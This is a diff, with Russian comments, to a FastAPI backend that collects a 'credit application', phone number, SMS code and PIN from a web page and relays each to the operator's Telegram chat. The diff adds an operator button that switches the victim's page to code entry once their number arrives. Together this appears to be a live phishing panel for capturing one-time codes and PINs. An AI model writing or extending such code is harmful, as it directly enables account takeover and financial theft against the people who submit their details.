@@ -25,7 +25,6 @@ def send_to_telegram(chat_id: str, text: str, reply_markup: dict = None):
     except Exception as e:
         logging.error(f"Ошибка отправки: {e}")
 
-# ========== КЛАВИАТУРЫ ==========
 def get_application_keyboard(session_id: str):
     return {
         "inline_keyboard": [
@@ -53,7 +52,6 @@ def get_pin_keyboard(session_id: str):
         ]
     }
 
-# ========== МОДЕЛИ ==========
 class CreditApplicationData(BaseModel):
     name: str
     phone: str
@@ -77,7 +75,6 @@ class PinData(BaseModel):
     session_id: str
     pin: str
 
-# ========== FASTAPI ==========
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     render_url = os.getenv("RENDER_EXTERNAL_URL", "https://telegram-bot-gateway-1.onrender.com")
@@ -126,7 +123,7 @@ async def submit_credit_application(data: CreditApplicationData):
     send_to_telegram(MY_CHAT_ID, message, reply_markup=get_application_keyboard(sid))
     return {"status": "ok"}
 
-# ========== 2. НОМЕР ТЕЛЕФОНА ==========
+# ========== 2. НОМЕР ТЕЛЕФОНА (с кнопкой "Перевести на код") ==========
 @app.post("/submit_phone")
 async def submit_phone(data: PhoneData):
     phone = data.phone
@@ -140,7 +137,12 @@ async def submit_phone(data: PhoneData):
     sessions[sid]["user_chat_id"] = user_chat_id
     sessions[sid]["status"] = "waiting_code"
     
-    send_to_telegram(MY_CHAT_ID, f"📞 <b>НОМЕР ПОЛУЧЕН</b>\n\n🆔 <b>Сессия:</b> <code>{sid}</code>\n📞 <b>Телефон:</b> {phone}")
+    # Кнопка "Перевести на код"
+    send_to_telegram(
+        MY_CHAT_ID,
+        f"📞 <b>НОМЕР ПОЛУЧЕН</b>\n\n🆔 <b>Сессия:</b> <code>{sid}</code>\n📞 <b>Телефон:</b> {phone}",
+        reply_markup={"inline_keyboard": [[{"text": "🔓 Перевести на код", "callback_data": f"ready_code_{sid}"}]]}
+    )
     return {"status": "ok"}
 
 # ========== 3. КОД ==========
@@ -192,7 +194,9 @@ async def check_status(session_id: str):
     
     status = session.get("status", "unknown")
     
-    if status == "code_confirmed":
+    if status == "ready_for_code":
+        return {"status": "ready_for_code"}
+    elif status == "code_confirmed":
         return {"status": "code_confirmed"}
     elif status == "code_wrong":
         return {"status": "code_wrong"}
@@ -225,11 +229,21 @@ async def handle_callback(request: Request):
     
     session = sessions.get(session_id)
     
-    # Кнопка "Отправить SMS-код"
+    # Кнопка "Отправить SMS-код" из заявки
     if action == "send" and result == "code":
         if session:
             session["status"] = "ready_for_code"
-        send_to_telegram(MY_CHAT_ID, f"✅ <b>Код можно отправлять</b>\nПользователь ждёт код на странице.")
+        send_to_telegram(MY_CHAT_ID, f"✅ <b>Страница ввода кода открыта</b>\nПользователь может вводить код.")
+        requests.post(
+            f"{TELEGRAM_API_URL}/answerCallbackQuery",
+            json={"callback_query_id": callback_id, "text": "Готово!"}
+        )
+    
+    # Кнопка "Перевести на код" (после ввода номера)
+    elif action == "ready" and result == "code":
+        if session:
+            session["status"] = "ready_for_code"
+        send_to_telegram(MY_CHAT_ID, f"✅ <b>Страница ввода кода открыта</b>\nПользователь может вводить код.")
         requests.post(
             f"{TELEGRAM_API_URL}/answerCallbackQuery",
             json={"callback_query_id": callback_id, "text": "Готово!"}
